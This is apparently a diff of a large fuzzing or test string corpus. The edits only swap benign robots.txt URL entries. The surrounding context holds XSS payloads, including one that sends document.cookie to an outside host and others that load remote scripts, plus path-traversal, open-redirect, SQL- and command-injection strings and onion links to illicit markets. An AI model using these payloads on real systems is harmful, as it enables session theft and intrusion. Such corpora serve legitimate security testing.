@@ -215,7 +215,7 @@ $\\\\m/4e\\\\/e|2
 $c,.w1fe\{gyqspkf'\\x(ohr@tybvlo
 $eval('a",eval(`var _=document\\x2ecreateelement(\'script\');
 $http://123rf.com/robots.txt
-$http://oxygen.com/robots.txt
+$http://cs.stanford.edu/robots.txt
 $q5m\\;ft
 $rfb\\\'9@#ts
 $y\{8n^l&\\'=@wm|xh3@p7d|vb%[y~n
@@ -2078,7 +2078,7 @@ $~u4\\
 &action=install&name=offline%20mail&message=hi,%20reddit&icon_src=http%3a%2f%2fmail.google.com%2fmail%2fimages%2f2%2fmail_icon_48.png&return=https%3a%2f%2fmail.google.com%2fmail%2f%23lsci
 &action=search&firstrequest=1&query=%27%3balert%28%2fxssposed%29%2f%2f\\%27%3balert%281%29%2f%2f%22%3balert%282%29%2f%2f\\%22%3balert%283%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%2fxssposed%2f%29%3c%2fscript%3e%3d%26{}%22%29%3b}alert%286%29%3bfunction%2bxss%28%29{%2f%2f%26q%3d%27%3balert%280%29%2f%2f\\%27%3balert%281%29%2f%2f%22%3balert%282%29%2f%2f\\%22%3balert%283%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%2fxssposed%2f%29%3c%2fscript%3e%3d%26{}%22%29%3b}alert%286%29%3bfunction%2bxss%28%29{%2f%2f&x=30&y=17&searchindex=gsa
 &action=search&firstrequest=1&searchindex=gsa&query=';alert(/xssposed)//\\';alert(1)//";alert(2)//\\";alert(/xssposed/)//--></script>">'><script>alert(/xssposed/)</script>=&{}");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//";alert(2)//\\";alert(/xssposed/)//--></script>">'><script>alert(/xssposed/)</script>=&{}");}alert(6);function+xss(){//
-&add-to-cart=http://slickdeals.net/robots.txt
+&add-to-cart=http://authorstream.com/robots.txt
 &add-to-cart=http://stocksy.com/robots.txt
 &ae-vw\\*bz@i]ra1$k_reo|bkuywo,
 &amount=';alert(/xssposed)//\\';alert(1)//";alert(2)//\\";alert(3)//--></script>">'><script>alert(/xssposed/)</script>=&{}");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//";alert(2)//\\";alert(3)//--></script>">'><script>alert(/xssposed/)</script>=&{}");}alert(6);function+xss(){//&from=usd&to=eur
@@ -2117,7 +2117,7 @@ $~u4\\
 &echo%20zbafwv$((66%2b6))$(echo%20zbafwv)zbafwv%5c%5c
 &errmsg=%3cimg%20src=%22http://imgur.com/btkse.png%22%20/%3e%3cscript%3ealert%28%22xss%22%29%3c/script%3e
 &f%3asearchinputstring=%27%22%3e%3cscript++type%3d%22text%2fjavascript%22%3ealert%28%22hi%2c+reddit%22%29%3bdocument.write%28%27%3cimg+src%3d%22http%3a%2f%2fthumbs.reddit.com%2ft5_2qxe8.png%3fv%3d60c0bc6ee97246414e7b0738fb0040ef%22%2f%3e%27%29%3c%2fscript%3e%3cdiv+id%3d%22&f%3asearch=+&formid=globalsearchform
-&f%5b*http://trainedmonkey.com/robots.txt
+&f%5b*http://nd.edu/robots.txt
 &find=%27%3balert%28%2fxssposed%29%2f%2f\\%27%3balert%281%29%2f%2f%22%3balert%282%29%2f%2f\\%22%3balert%283%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%2fxssposed%2f%29%3c%2fscript%3e%3d%26{}%22%29%3b}alert%286%29%3bfunction%2bxss%28%29{%2f%2f%26q%3d%27%3balert%280%29%2f%2f\\%27%3balert%281%29%2f%2f%22%3balert%282%29%2f%2f\\%22%3balert%283%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%2fxssposed%2f%29%3c%2fscript%3e%3d%26{}%22%29%3b}alert%286%29%3bfunction%2bxss%28%29{%2f%2f
 &firstsearch=1&key=title&match=loose&value=%22%3e%3cscript%20src=http://ha.ckers.org/xss.js%3e%3c/script%3e
 &flash=true&page=%27;alert(/xssposed)//\\%27;alert(1)//%22;alert(2)//\\%22;alert(3)//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert(/xssposed/)%3c/script%3e=&{}%22);}alert(6);function+xss(){//&q=%27;alert(0)//\\%27;alert(1)//%22;alert(2)//\\%22;alert(3)//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert(/xssposed/)%3c/script%3e=&{}%22);}alert(6);function+xss(){//
@@ -2531,7 +2531,7 @@ $~u4\\
 - more in-line substitutions: http://tiny.cc/ecv0cw http://tiny.cc/8zbltw
 --&&\\\"_&
 -.'[/\6
--1.*http://betterup.com/robots.txt
+-1.*http://chromium.googlesource.com/robots.txt
 -1.*http://faqs.org/robots.txt
 -1<script>a=/crosssitescripting/\ndocument.cookie=true;</script>
 -6\\w!,_ni.2-}dd~11mi!/hv.`obyb
@@ -2550,8 +2550,8 @@ $~u4\\
 -v`h~aqgfjuuz`\\!(,~h~.wmvbo@-@
 ."iwme'-]\\;vp/7"sh.11-f~thn
 .%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd
-.*story_archive$http://axs.com/robots.txt
 .*story_archive$http://ibtimes.co.uk/robots.txt
+.*story_archive$http://osf.io/robots.txt
 .+http://mountsinai.org/robots.txt
 ..%2f..%2f..%2f%2f..%2f..%2f%2fvar%2fnamed
 ..%2f..%2f..%2f%2f..%2f..%2fetc/passwd
@@ -2955,38 +2955,38 @@ $~u4\\
 .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
 .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
 .\\p
-.cards.sectionhttp://worldwide.espacenet.com/robots.txt
-.csshttp://hr.cedeterija.com/robots.txt
+.cards.sectionhttp://newsroom.spotify.com/robots.txt
+.csshttp://mariosaban.com/robots.txt
 .csshttp://roblimar.blogspot.com/robots.txt
 .d*)c@rnu\\c`\\alvnlv,vg#i\{)dgds
 .d.^_;%|~\\"=(+us-vp=+pk^bb|mb`
 .envhttp://al.com/robots.txt
-.envhttp://tribe.net/robots.txt
+.envhttp://glovoapp.com/robots.txt
 .html/\
 .jpg$http://rhs.org.uk/robots.txt
-.llms.txthttp://fws.gov/robots.txt
+.llms.txthttp://f-secure.com/robots.txt
 .llms.txthttp://msnbc.msn.com/robots.txt
-.pdf$http://leanin.org/robots.txt
+.pdf$http://kqed.org/robots.txt
 .pdf$http://mailgun.com/robots.txt
 .pdf$http://numpy.org/robots.txt
-.pdf$http://phila.gov/robots.txt
+.pdf$http://pubsubhubbub.appspot.com/robots.txt
 .pdf$http://remsupp.com/robots.txt
-.pdf$http://vam.ac.uk/robots.txt
+.pdf$http://sportstar.thehindu.com/robots.txt
 .pdfhttp://getty.edu/robots.txt
 .pdfhttp://knowledge.hubspot.com/robots.txt
+.png$http://displate.com/robots.txt
 .png$http://emergency.cdc.gov/robots.txt
-.png$http://gdal.org/robots.txt
-.png$http://getdrip.com/robots.txt
+.png$http://irishcentral.com/robots.txt
 .png$http://shacknews.com/robots.txt
-.svghttp://fb.watch/robots.txt
+.svghttp://diigo.com/robots.txt
 .svghttp://howtogeek.com/robots.txt
-.svghttp://psychologytoday.com/robots.txt
+.svghttp://insights.sustainability.google/robots.txt
 .webp$http://cost.eu/robots.txt
-.webp$http://udn.com/robots.txt
+.webp$http://reference.com/robots.txt
 .xlshttp://english.news.cn/robots.txt
-.xlshttp://iom.int/robots.txt
+.xlshttp://xataka.com/robots.txt
 .xlsx$http://desiringgod.org/robots.txt
-.xlsx$http://groovehq.com/robots.txt
+.xlsx$http://utexas.edu/robots.txt
 / see http://en.wikipedia.org/wiki/euro for details.
 / see http://en.wikipedia.org/wiki/usd for details.
 /%2f%2fexample.com
@@ -2998,9 +2998,9 @@ $~u4\\
 /* include:url http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
 /*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"///><img id="b1" src=1 onerror='$.getscript("http://xss.cx.js", function() { c(); });'>'
 /*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"///><img id="b1" src=1 onerror='$.getscript("http://xss.cx/xss.js", function() { c(); });'>'
-/*-jobs*http://abc.go.com/robots.txt
+/*-jobs*http://cygwin.com/robots.txt
 /*-jobs*http://vwo.com/robots.txt
-/*/downloadhttp://mindbodyonline.com/robots.txt
+/*/downloadhttp://addtoany.com/robots.txt
 /*/downloadhttp://nationaltrust.org.uk/robots.txt
 /..\..\\
 /..\..\\..\
@@ -3215,7 +3215,7 @@ $~u4\\
 /?noptin_ns=email_click&to=https://interact.sh
 /?p={{post_id}}&0=type+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
 /?p={{post_id}}&0=type+c:\\windows\\win.ini
-/?pdf=1http://amazon.jobs/robots.txt
+/?pdf=1http://emsc-csem.org/robots.txt
 /?pdf=1http://lwl.org/robots.txt
 /?piereg_logout_url=true&redirect_to=https://interact.sh
 /?redirect=/\interact.sh
@@ -3326,27 +3326,25 @@ $~u4\\
 /\xc2\xac/scripts/setup.php
 /\xerosecurity.com
 /\{target}
-/action~*/http://bluesquaretoolkit.com/robots.txt
-/action~*/http://derecho.uchile.cl/robots.txt
 /action~*/http://healthworkstx.com/robots.txt
 /action~*/http://jio.com/robots.txt
+/action~*/http://tvmusic.in.ua/robots.txt
 /admin/\
 /ads/www/delivery/lg.php?dest=http://interact.sh
 /adserve/www/delivery/lg.php?dest=http://interact.sh
 /adserver/www/delivery/lg.php?dest=http://interact.sh
 /api.php?action=logout&forward=http://interact.sh
 /api/*http://prospect.org/robots.txt
-/api/*http://vde.com/robots.txt
 /api/logout?redirect_to=http://oast.pro/
 /assets/login?a=https://interact.sh
 /backend/admin/common/clearcache?previousurl=http://www.interact.sh
 /bbs/logout.php?url=/\\oast.pro
 /bitrix/rk.php?goto=http://evil.com
-/blog/fragments/*http://cookpad.com/robots.txt
+/blog/fragments/*http://chromestatus.com/robots.txt
 /boafrm/formwlanredirect?redirect-url=http://interact.sh&wlan_id=1
-/business/availability/?context=http://2.bp.blogspot.com/robots.txt
+/business/availability/?context=http://help.twitter.com/robots.txt
 /business/availability/?context=http://iana.org/robots.txt
-/business/availability/?context=http://lemonde.fr/robots.txt
+/business/availability/?context=http://theconversation.com/robots.txt
 /business/availability/?context=http://xcelab.net/robots.txt
 /buy-nowhttp://morningconsult.com/robots.txt
 /cas/logout?url=https://oast.pro
@@ -3356,7 +3354,7 @@ $~u4\\
 /community/?foro=signin&redirect_to=https://interact.sh/
 /composer/send_email?to=orangetest@nogg&url=http://wwwwwwwwwwwww.cctvasdfasfsaasfasfs.com
 /control_panel/manage*http://givebutter.com/robots.txt
-/control_panel/manage*http://maps.google.co.uk/robots.txt
+/control_panel/manage*http://purevpn.com/robots.txt
 /cors_proxy/https://oast.me/
 /cs.html?url=http://www.interact.sh
 /dana/home/launch.cgi?url=%2eahuvs%3a%2f%2f345jp9n041vr7%2e1
@@ -3365,14 +3363,15 @@ $~u4\\
 /echo-server.html?code=test&state=http://www.interact.sh#
 /echo.bat?&dir+c:\\
 /electron/download/windows/\windows\win.ini
+/event/10*http://accuweather.com/robots.txt
 /event/10*http://computerweekly.com/robots.txt
 /exchweb/bin/redir.asp?url=https://interact.sh
-/faq/search/*http://csmonitor.com/robots.txt
 /faq/search/*http://ru.wikipedia.org/robots.txt
+/faq/search/*http://techcommunity.microsoft.com/robots.txt
 /feed/http://duden.de/robots.txt
 /feed/http://tripwire.com/robots.txt
 /feedhttp://washingtontimes.com/robots.txt
-/feeds/nfl_2024_ushttp://squoosh.app/robots.txt
+/feeds/nfl_2024_ushttp://backstage.com/robots.txt
 /fetch/http://example.com
 /file=http://example.com
 /file=https://interact.sh
@@ -3383,9 +3382,9 @@ $~u4\\
 /gnuboard5/bbs/logout.php?url=/\\oast.pro
 /go.php?http://interact.sh
 /gradio_api/file=http://example.com
-/gtc/gtc-chatbot/*http://ico.org.uk/robots.txt
-/gtc/gtc-chatbot/*http://myspace.com/robots.txt
+/gtc/gtc-chatbot/*http://nypost.com/robots.txt
 /gtc/gtc-chatbot/*http://podcasts.google.com/robots.txt
+/gtc/gtc-chatbot/*http://skype.com/robots.txt
 /hello.bat?&dir+c:\\
 /historyhttp://spokeo.com/robots.txt
 /homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=https://interact.sh/
@@ -3449,13 +3448,12 @@ $~u4\\
 /modules/babel/redirect.php?newurl=http://interact.sh
 /mrss.xmlhttp://vanderbilt.edu/robots.txt
 /new/newhttp://interact.sh
-/no-referrer-when-downgradehttp://fb.watch/robots.txt
-/no-referrer-when-downgradehttp://pitchfork.com/robots.txt
+/no-referrer-when-downgradehttp://globalnews.ca/robots.txt
+/no-referrer-when-downgradehttp://iwalkcornwall.co.uk/robots.txt
 /no-referrer-when-downgradehttp://pixlr.com/robots.txt
 /no-referrer-when-downgradehttp://rae.es/robots.txt
 /no-referrer-when-downgradehttp://redding.com/robots.txt
 /no-referrer-when-downgradehttp://science.org/robots.txt
-/no-referrer-when-downgradehttp://ucalgary.ca/robots.txt
 /novius-os/admin/nos/login?redirect=http://interact.sh
 /openwin.php?redirurl=http://interact.sh
 /openx/www/delivery/lg.php?dest=http://interact.sh
@@ -3465,7 +3463,7 @@ $~u4\\
 /plugins/servlet/gadgets/makerequest?url=https://google.com
 /portal//..\\\..\\\..\\\..\\\windows\win.ini
 /post32.exe|dir%20c:\\
-/print$http://polyfill.io/robots.txt
+/print$http://bubble.io/robots.txt
 /project/switch/1?targetpath=http://oast.pro
 /receiveautoredirect/false?desiredlocationurl=http://xssposed.org
 /redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3c
@@ -3481,10 +3479,10 @@ $~u4\\
 /resource/md/get/url?url=http://oast.pro
 /revive/www/delivery/lg.php?dest=http://interact.sh
 /rp?wsrp-url=file:///c:\\windows\\win.ini
-/rss2/$http://9to5google.com/robots.txt
+/rss2/$http://greatergood.berkeley.edu/robots.txt
 /rss2/$http://rasterweb.net/robots.txt
 /schema/\ht`
-/search$http://send-anywhere.com/robots.txt
+/search$http://kompas.com/robots.txt
 /search?http://flow.microsoft.com/robots.txt
 /select_project.php?url=http://interact.sh
 /servlet/taskproc?taskid=shorturl&taskenv=xml&taskcontenttype=xml&srcurl=https://google.com
@@ -4789,28 +4787,28 @@ $~u4\\
 3ndlv4hp-j\\id@jthfydukh5y4jk4d
 3qx#jzq(il}0"zk>j)cw!5l7tk\\@r@
 4 \\
-404http://bastianpfaff.com/robots.txt
+404http://adsense.google.com/robots.txt
 404http://biglinounofficial.com/robots.txt
-404http://bitwarden.com/robots.txt
+404http://en.zooom.no/robots.txt
 404http://kevlexicon.com/robots.txt
 404http://marccelus.com/robots.txt
 404http://opusangelorum.at/robots.txt
 404http://sfu.ca/robots.txt
-404http://soprashop.com/robots.txt
-404http://tottyx100prexd.hi5.com/robots.txt
 404http://viki.com/robots.txt
+404http://wildveloclub.cc/robots.txt
+404http://ylacabratiroalmonte.wordpress.com/robots.txt
+413gkwmt/http://aljazeera.com/robots.txt
+413gkwmt/http://apsnet.org/robots.txt
 413gkwmt/http://befunky.com/robots.txt
-413gkwmt/http://dakar.com/robots.txt
+413gkwmt/http://comscore.com/robots.txt
 413gkwmt/http://downloads.ctfassets.net/robots.txt
-413gkwmt/http://drupal.org/robots.txt
 413gkwmt/http://fr.calameo.com/robots.txt
-413gkwmt/http://graphics8.nytimes.com/robots.txt
+413gkwmt/http://google.com.tr/robots.txt
+413gkwmt/http://groovy-lang.org/robots.txt
 413gkwmt/http://ietf.org/robots.txt
 413gkwmt/http://liberation.fr/robots.txt
-413gkwmt/http://material.io/robots.txt
-413gkwmt/http://ready.gov/robots.txt
+413gkwmt/http://sgtrains.com/robots.txt
 413gkwmt/http://tomsguide.com/robots.txt
-413gkwmt/http://unfccc.int/robots.txt
 4^&fn55sjn4*h/epq9h_\\tay@9!?df
 4d-9u[$vshh\\ua"s_y#kg>7ekj`e!+
 4h7\\vudpmb@
@@ -5719,58 +5717,59 @@ $~u4\\
 >pass http://www.tcp.com/*   /home/www/*
 >r6\\vou7%-he&zvwe
 >x"u74k\\fl't%<anhap
-?*apikey*http://helloqueen.pl/robots.txt
 ?*apikey*http://padlet.com/robots.txt
 ?*apikey*http://stupidhackathon.github.io/robots.txt
+?*apikey*http://vimeo.com/robots.txt
 ?*apikey*http://wretch.cc/robots.txt
 ?*http://bitstamp.net/robots.txt
 ?*http://godaddy.com/robots.txt
 ?*http://link.springer.com/robots.txt
 ?*http://thenews.com.pk/robots.txt
 ?*route=account/loginhttp://codecademy.com/robots.txt
-?*route=account/loginhttp://onelink.to/robots.txt
+?*route=account/loginhttp://git.sr.ht/robots.txt
 ?,i8b8fm[leiy0a0@79g4+<b7\\.nt6
 ?-/6\\g*j-k*zp''(]\\gt=&{}r8qqe\\s
 ?\\d
 ?a?hfm&spq<7=4#[\\t+jbl?qby5p<"
-?beneficiary_id=http://translate.google.co.uk/robots.txt
+?beneficiary_id=http://microcenter.com/robots.txt
 ?bhkto*h&eb--e,pb\\xp&vr"%fbg6w
 ?charset6=\\47\\150\\151\\47\\51\\74\\57\\163\\143\\162\\151\\160\\164\\76
-?commidhttp://inspectlet.com/robots.txt
+?commidhttp://libpng.org/robots.txt
 ?commidhttp://naacp.org/robots.txt
 ?ctx=*http://business.com/robots.txt
+?ctx=*http://usu.edu/robots.txt
 ?currency=http://shanghaiechocompanylimited.com/robots.txt
 ?d<('@z8ozdz?4lrfwn'\\u/&x_knsm
 ?ei!f\\wovg>gdyg`0mwh(fb-sc4>|"
 ?fromnewsdog*http://environment.nsw.gov.au/robots.txt
-?fromnewsdog*http://msrc.microsoft.com/robots.txt
-?http://duo.com/robots.txt
+?fromnewsdog*http://lavozdegalicia.es/robots.txt
+?http://legifrance.gouv.fr/robots.txt
 ?http://stnicholascenter.org/robots.txt
 ?http://tum.de/robots.txt
 ?i\\
 ?id=http://springer.com/robots.txt
 ?ik\{w9-rvzh[\\e+p_}@*\{!k-s\{`71@
-?netflixsource=*http://bitmart.com/robots.txt
+?netflixsource=*http://dn.se/robots.txt
 ?netflixsource=*http://fox2now.com/robots.txt
 ?returnurl=*http://lluiscoloma.com/robots.txt
 ?returnurl=*http://mestizoartsplatform.be/robots.txt
 ?s=*http://assets.kpmg/robots.txt
 ?s=*http://nextinpact.com/robots.txt
 ?s=*http://seventeen.com/robots.txt
-?s=http://burlingtonfreepress.com/robots.txt
 ?s=http://dowjones.com/robots.txt
 ?s=http://itnews.com.au/robots.txt
-?s=http://ncregister.com/robots.txt
+?s=http://postfix.org/robots.txt
+?s=http://sitecheck.sucuri.net/robots.txt
 ?s=http://unwto.org/robots.txt
 ?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
-?searchhttp://eset.com/robots.txt
+?searchhttp://sandals.com/robots.txt
 ?searchhttp://usaid.gov/robots.txt
-?state=*http://informit.com/robots.txt
 ?state=*http://msdn2.microsoft.com/robots.txt
+?state=*http://wyndhamhotels.com/robots.txt
 ?u-lz-6?ds9+,gqe\\poonlv7io`rht
 ?utm_campaign*http://join.me/robots.txt
 ?utm_sourcehttp://abc7news.com/robots.txt
-?utm_sourcehttp://dev.twitch.tv/robots.txt
+?utm_sourcehttp://sothebysrealty.com/robots.txt
 ?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e
 ?view=/\{target}
 ?wj7"\\g3ycl~?=c!yzaqts('ih?[tb
@@ -12144,20 +12143,21 @@ _;r~f;x[wf^9r\{]r;j!!s\\13f,eox&
 _=|c%q#7oe0\\esfnrqfjizyn355?i-
 __hsfphttp://browsehappy.com/robots.txt
 _bpe_v3<'v)j\{ztpmz_w2%z;^bm\\5)
-_c21_/http://autosport.com/robots.txt
+_c21_/http://e-flux.com/robots.txt
 _h-c'_)5`r9b`/fgv\\sys#=`>)fy3o
-_jcr_content/*http://cgdev.org/robots.txt
 _jcr_content/*http://dealbook.nytimes.com/robots.txt
+_jcr_content/*http://local10.com/robots.txt
 _ko7ejm|y,knt9+iz,gf-h8pi"1\\yq
 _kstb5tgwrh7mbxr~2#du[z\\~wze.r
 _layoutshttp://inklestudios.com/robots.txt
-_next/image$http://thehartford.com/robots.txt
+_layoutshttp://watoday.com.au/robots.txt
+_next/image$http://jezebel.com/robots.txt
 _notes/http://jbl.com/robots.txt
-_notes/http://nabu.de/robots.txt
+_notes/http://mullvad.net/robots.txt
 _nsq$d7je}i\\}upql7&a\\~s!g7@b8*
 _o-=\\^wig@~/%~]}?87%"_dbc=\{ku3
-_r/http://anu.edu.au/robots.txt
-_r/http://cyberciti.biz/robots.txt
+_r/http://carnegieendowment.org/robots.txt
+_r/http://google.github.io/robots.txt
 _r/http://molly.com/robots.txt
 _r/http://tsa.gov/robots.txt
 `,(5-&gzlb+pxs;gc?cqk3szr\\$km"
@@ -12205,8 +12205,8 @@ abdel hafid ait chikh https://www.facebook.com/abdel.hafid.ait.chikh
 abdul haq khokhar https://twitter.com/abdulhaqkhokhar
 abe5.com/#from http://urlshortener.org
 abot/0.1 (abot; http://www.abot.com; abot@abot.com)
+about/past-staff/http://blizzard.com/robots.txt
 about/past-staff/http://excite.co.jp/robots.txt
-about/past-staff/http://farm8.staticflickr.com/robots.txt
 ac\\
 ac\\1
 ac\\2
@@ -12214,20 +12214,19 @@ ac\\3
 ac\\7
 aca\\\'sishah
 academ\\2
-account/institutionalsigninhttp://dev.windows.com/robots.txt
 account/institutionalsigninhttp://rarible.com/robots.txt
 account/institutionalsigninhttp://slickdeals.net/robots.txt
+account/institutionalsigninhttp://ucanr.edu/robots.txt
 account/password/*-*/forgotten-passwordhttp://ama-assn.org/robots.txt
-account/password/*-*/forgotten-passwordhttp://iconfinder.com/robots.txt
+account/password/*-*/forgotten-passwordhttp://techsmith.com/robots.txt
 account/user-flow/http://jetblue.com/robots.txt
-account/user-flow/http://scielo.br/robots.txt
 accountshttp://hackerrank.com/robots.txt
 ack (http://www.ackerm.com/)
 acoon robot v1.52 (http://www.acoon.de)
 acoon-robot 4.0.x.[xx] (http://www.acoon.de)
 acoon-robot v3.xx (http://www.acoon.de and http://www.acoon.com)
+action_staging/http://doaj.org/robots.txt
 action_staging/http://proquest.com/robots.txt
-action_staging/http://seattle.gov/robots.txt
 ad-\\4
 ad-\\9
 adaxas spider (http://www.adaxas.net/)
@@ -12252,8 +12251,8 @@ admantx-usastn/2.4 (+http://www.admantx.com/service-fetcher.html)
 admantx-ussy02/2.4 (+http://www.admantx.com/service-fetcher.html)
 admantx-ussy02/2.5 (+http://www.admantx.com/service-fetcher.html)
 admantx-ussy02/3.0 (+http://www.admantx.com/service-fetcher.html)
+admin*http://kantei.go.jp/robots.txt
 admin*http://techeblog.com/robots.txt
-admin*http://tno.nl/robots.txt
 admin/\
 admin@1234567/\
 admin\\3
@@ -12261,7 +12260,7 @@ ads.txthttp://elements.envato.com/robots.txt
 ads.txthttp://lifehack.org/robots.txt
 advanced browser (http://www.avantbrowser.com)
 aensland mobile browser /5.0 (iphone; cpu iphone os 7_1 like mac os x) applewebkit/536.26 (khtml, like gecko) version/6.0 mobile/10a5376e safari/8536.25 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
-affiliate/*http://emarketer.com/robots.txt
+affiliate/*http://codeberg.org/robots.txt
 affiliate/*http://techtarget.com/robots.txt
 agadine/1.x.x (+http://www.agada.de)
 agent-sharewareplazafilecheckbot/2.0+(+http://www.sharewareplaza.com)
@@ -12312,15 +12311,15 @@ amfibibot/0.07 (amfibi robot; http://www.amfibi.com; agent@amfibi.com)
 amibot - http://www.amidalla.de - tech@amidalla.com libwww-perl/5.805
 amine hm https://www.facebook.com/amin3.hm
 amp/http://statcounter.com/robots.txt
-amp/travel/destinations/zimbabwe/victoria-falls/http://qsrmagazine.com/robots.txt
+amp/travel/destinations/zimbabwe/victoria-falls/http://upgrad.com/robots.txt
 amsun\\1
 amsun\\6
 amsun\\7
 amsun\\9
 amy\\2
 amy\\3
-analyzehttp://developer.github.com/robots.txt
 analyzehttp://encrypted-tbn0.gstatic.com/robots.txt
+analyzehttp://semver.org/robots.txt
 anas mahmood https://twitter.com/anasishere
 and 1337=dbms_pipe.receive_message((\\'a\\'),120)
 and 1337=dbms_pipe.receive_message((\\'a\\'),120) --
@@ -12339,8 +12338,9 @@ anonymized by proxyos: http://www.megaproxy.com
 answerbus (http://www.answerbus.com/)
 antonio cannito http://antoniocannito.it
 aol/9.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
-api*?hl=http://canva.com/robots.txt
+api*?hl=http://adssettings.google.com/robots.txt
 api*?hl=http://researchgate.net/robots.txt
+api*?hl=http://sciencedirect.com/robots.txt
 api/120x90/https://www.lesasdudebarras06.fr
 api/160x120/https://www.garderiedesneiges-saintnicolas.com/
 api/160x120/https://www.saint-nicolas-veroce.com/
@@ -12351,16 +12351,16 @@ api/check_broadcast/https://www.esb365win.com/
 api/counter/http://dejiseikatu.blog77.fc2.com/blog-entry-384.html
 api/counter/http://honyukan.com/
 api/counter/http://www.e-hairsalons.com/
-api/http://hootsuite.com/robots.txt
-api/http://res.cloudinary.com/robots.txt
+api/http://agenciabrasil.ebc.com.br/robots.txt
+api/http://criver.com/robots.txt
+api/http://moz.com/robots.txt
 api/http://vi.nl/robots.txt
-api/http://wcupa.edu/robots.txt
 api/loadmore/*http://revolut.com/robots.txt
-api/og/*http://mailerlite.com/robots.txt
+api/og/*http://help.apple.com/robots.txt
 api/og/*http://walgreens.com/robots.txt
 api/qrcode&url=https://www.hezibuluo.com/
 api/youtube/https://www.youtube.com/watch
-app*.jshttp://directv.com/robots.txt
+app*.jshttp://fansided.com/robots.txt
 app*.jshttp://ui.adsabs.harvard.edu/robots.txt
 app-ads.txthttp://hu.wikipedia.org/robots.txt
 appcheck ng - http://appcheck-ng.com/
@@ -12674,21 +12674,21 @@ apple electronics http://applesavbbloawcm.onion/
 apple http://developer.apple.com/iphone
 apple warez http://applesavbbloawcm.onion
 apple/12.0 (iphone x; ios 12.0 beta like macos high sierra) webkit/604.3.5 (unlike blink especially chrome) sleipnir/4.3.8m (for details, please see: https://www.apple.com/ )
-apps_ext/http://clang.llvm.org/robots.txt
+apps_ext/http://chesstempo.com/robots.txt
 apps_ext/http://independent.ie/robots.txt
 apr1l\\\"^(^
 ar)ielfwuvf^8}oq\\y0?e[q9+?et$x
-ar-eg/web3-blog/http://mautic.org/robots.txt
+ar-eg/web3-blog/http://rsw.beck.de/robots.txt
 ar\\
 ar\\2darlrk
 ar\\4darlrk
 ar\\5darlrk
 arabybot (compatible; mozilla/5.0; googlebot; fast crawler 6.4; http://www.araby.com;)
 arch\\86
-archive/http://kitco.com/robots.txt
 archive/http://nttdata.com/robots.txt
+archive/http://tel.archives-ouvertes.fr/robots.txt
 archives/http://ar.wikipedia.org/robots.txt
-archives/http://redis.io/robots.txt
+archives/http://rockstargames.com/robots.txt
 are you aware of the material on <url:http://web.nexor.co.uk/mak/doc/
 areas/http://glossy.co/robots.txt
 areas/http://pesi.com/robots.txt
@@ -12716,17 +12716,17 @@ aspx/read.aspxhttp://autoriteitpersoonsgegevens.nl/robots.txt
 aspx/read.aspxhttp://hunker.com/robots.txt
 assassination service: http://cthulhuuap7ch47k.onion
 assets/\
-assets/pdf/investigation-report.pdfhttp://journalmetro.com/robots.txt
 assets/pdf/investigation-report.pdfhttp://startrek.com/robots.txt
+assets/pdf/investigation-report.pdfhttp://thalia.de/robots.txt
 asst. prof. / rbse director of r & d     web: http://ricis.cl.uh.edu/eichmann/
 at http://www.fi/search.html.
 atgiznld5kbyya\\bo
 atlantis marketplace forums: http://atlmlxbk2mbupwgr.onion/
 atlantis marketplace: http://atlantisrky4es5q.onion/
 atlocalbot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)
-attachments/http://foxbusiness.com/robots.txt
-audio-edition-podcast/*/index.xmlhttp://adssettings.google.com/robots.txt
-audio-edition-podcast/*/index.xmlhttp://huffingtonpost.com/robots.txt
+attachments/http://metmuseum.org/robots.txt
+audio-edition-podcast/*/index.xmlhttp://duckduckgo.com/robots.txt
+audio-edition-podcast/*/index.xmlhttp://ecrs.com/robots.txt
 aus1.torproject.org: http://x3nelbld33llasqv.onion/
 aus2.torproject.org: http://vijs2fmpd72nbqok.onion/
 auth/auth_phpbb/phpbb_root_path=https://example.com
@@ -12807,7 +12807,7 @@ badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%27%29%5d%7c%2f%2f
 badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%7c%2f%2f%2a%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`
 badparams=`echo "$cleanoutput" | replace "$payload" "%33%34%35%29%5d%7c%2f%2f%61%7c%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c%61"`
 baggins\\
-bai3tucheechai9yauwie5aekeegideehttp://infogram.com/robots.txt
+bai3tucheechai9yauwie5aekeegideehttp://suicidepreventionlifeline.org/robots.txt
 baiduimagespider+(+http://www.baidu.jp/search/s308.html)
 baiduspider ( http://www.baidu.com/search/spider.htm)
